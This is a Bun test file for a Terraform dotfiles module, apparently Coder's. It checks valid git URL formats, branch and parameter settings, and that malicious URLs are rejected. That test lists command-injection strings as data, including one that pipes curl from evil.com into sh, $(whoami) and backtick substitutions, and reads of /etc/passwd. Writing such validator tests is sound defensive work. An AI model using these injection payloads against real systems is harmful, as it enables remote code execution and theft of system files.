import { describe, expect, it } from "bun:test";
import {
  runTerraformApply,
  runTerraformInit,
  testRequiredVariables,
} from "~test";

describe("dotfiles", async () => {
  await runTerraformInit(import.meta.dir);

  testRequiredVariables(import.meta.dir, {
    agent_id: "foo",
  });

  it("default output is empty string", async () => {
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
    });
    expect(state.outputs.dotfiles_uri.value).toBe("");
  });

  it("accepts valid git URL formats", async () => {
    const validUrls = [
      "https://github.com/coder/dotfiles",
      "https://github.com/coder/dotfiles.git",
      "git@github.com:coder/dotfiles.git",
      "git://github.com/coder/dotfiles.git",
      "ssh://git@github.com/coder/dotfiles.git",
      "ssh://git@bitbucket.example.org:7999/~myusername/dotfiles.git",
    ];
    for (const url of validUrls) {
      const state = await runTerraformApply(import.meta.dir, {
        agent_id: "foo",
        dotfiles_uri: url,
      });
      expect(state.outputs.dotfiles_uri.value).toBe(url);
    }
  });

  it("rejects invalid or malicious URLs", async () => {
    const invalidUrls = [
      "https://github.com/user/repo; curl http://evil.com | sh",
      "https://github.com/$(whoami)/repo",
      "https://github.com/`id`/repo",
      "https://github.com/user/repo|cat /etc/passwd",
      "file:///etc/passwd",
      "not-a-valid-url",
    ];
    for (const url of invalidUrls) {
      await expect(
        runTerraformApply(import.meta.dir, {
          agent_id: "foo",
          dotfiles_uri: url,
        }),
      ).rejects.toThrow();
    }
  });

  it("set custom order for coder_parameter", async () => {
    const order = 99;
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
      coder_parameter_order: order.toString(),
    });
    expect(state.resources).toHaveLength(3);
    const parameters = state.resources.filter(
      (r) => r.type === "coder_parameter",
    );
    for (const param of parameters) {
      expect(param.instances[0].attributes.order).toBe(order);
    }
  });

  it("set custom dotfiles_branch", async () => {
    const branch = "develop";
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
      dotfiles_branch: branch,
    });
    expect(state.resources).toHaveLength(2);
    const scriptResource = state.resources.find(
      (r) => r.type === "coder_script",
    );
    expect(scriptResource?.instances[0].attributes.script).toContain(
      `DOTFILES_BRANCH="${branch}"`,
    );
  });

  it("default dotfiles_branch creates parameter", async () => {
    const state = await runTerraformApply(import.meta.dir, {
      agent_id: "foo",
    });
    expect(state.resources).toHaveLength(3);
    const branchParameter = state.resources.find(
      (r) =>
        r.type === "coder_parameter" &&
        r.instances[0].attributes.name === "dotfiles_branch",
    );
    expect(branchParameter).toBeDefined();
    expect(branchParameter?.instances[0].attributes.default).toBeNull();
  });
});
